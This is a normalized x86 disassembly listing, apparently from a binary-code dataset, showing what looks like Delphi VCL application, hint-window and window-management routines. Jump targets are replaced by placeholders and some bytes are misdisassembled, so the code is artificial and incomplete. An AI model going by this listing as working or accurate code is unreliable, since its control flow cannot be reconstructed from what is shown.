lea eax [ ebp - 0x254 ]
call sub_408ca8
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_44892c
test al al
je r-xdata
xor eax eax
push ebp
push sub_45b203
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404168
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404168
sub_45b2b8
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_45db18
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45d8cc
mov dl 0x1
mov eax [ rw-data ]
call sub_45d8cc
sub_45b324
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_45b34c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_45b324
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_40695c
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_4068e4
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45b3dc
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_45b521
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45d8cc
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41e03c
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41e03c
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_41e120
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41e03c
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_41e03c
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41e03c
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_45d8cc
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_41de80
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_41de80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b528
cmp [ rw-data ] 0x0
je r-xdata
sub_45b560
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_45b5c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_45b6fc ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_45b770
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45aec8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_414108
mov dl [ ebp - 0x1 ]
call sub_45b5c0
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_45aeb4
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_413fac
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_414184
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_414108
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_45b560
test al al
je r-xdata
inc esi
sub_45b8bc
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45aec8
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_45aeb4
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_45b914
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_45b8bc
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45b98e
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_45b770
pop ecx
push ebp
mov al 0x2
call sub_45b770
pop ecx
push ebp
mov al 0x3
call sub_45b770
pop ecx
push ebp
mov al 0x4
call sub_45b770
pop ecx
push ebp
mov al 0x5
call sub_45b770
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403124
retn
sub_45b99c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45b530
xor eax eax
push ebp
push sub_45ba15
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45b914
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_45b538
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45ba30
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403ef8
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403f4c
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_45ba88
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push j_sub_4035c4#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_45ded4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45badc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_43bcfc
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_45df50
sub_45bb38
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45cff0
sub_45bb7c
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_45bb38
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_45badc
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_45bbf0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_45bc4c
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_45bc7c
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_45bca4
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_45bc4c
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_45bc7c
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_45bc7c
sub_45bce4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41aa7c
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403448
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45d3bc
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_424854
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_424c24
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_45db54
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c4e8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45d5b4
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c510
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_40865c
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_404168
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_45dd30
mov eax ebx
call sub_45e744
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_45bfec
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_45becd
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_4034b0
mov ebx edx
mov esi eax
mov eax esi
call sub_45e754
mov [ esp + 0x4 ] esi
mov [ esp ] sub_45d3bc
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_45d5b4
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_45df50
xor edx edx
mov eax esi
call sub_45d8cc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aac8
push esi
push sub_45c420
mov eax esi
call sub_45d1a8
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405598
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403124
mov eax [ esi + 0x90 ]
call sub_403124
mov eax [ esi + 0x98 ]
call sub_403124
test bl bl
jle r-xdata
call sub_41bba4
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_45bfec
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45c18d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c194
lea eax [ ebp - 0x2c ]
call sub_403ef8
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_45c56c
call sub_41bb0c
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_4043b8
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_4069dc
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403ef8
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_45cc70
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45cc70
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_45c19c
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_45aed0
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_45c1fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_413fac
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_443c60
cmp ebx eax
je r-xdata
sub_45c26c
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_45c1fc
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_414108
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45c384
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
